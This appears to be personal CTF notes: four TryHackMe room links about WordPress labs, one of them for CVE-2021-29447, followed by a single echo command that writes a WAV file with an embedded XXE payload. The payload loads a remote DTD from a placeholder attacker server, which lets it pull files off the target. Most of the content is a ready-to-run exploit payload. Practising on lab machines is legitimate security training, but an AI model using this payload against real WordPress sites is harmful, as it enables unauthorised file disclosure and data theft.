https://tryhackme.com/room/bypassreallysimplesecurity

https://tryhackme.com/room/wordpresscve202129447

https://tryhackme.com/room/blog

https://tryhackme.com/room/solar



echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
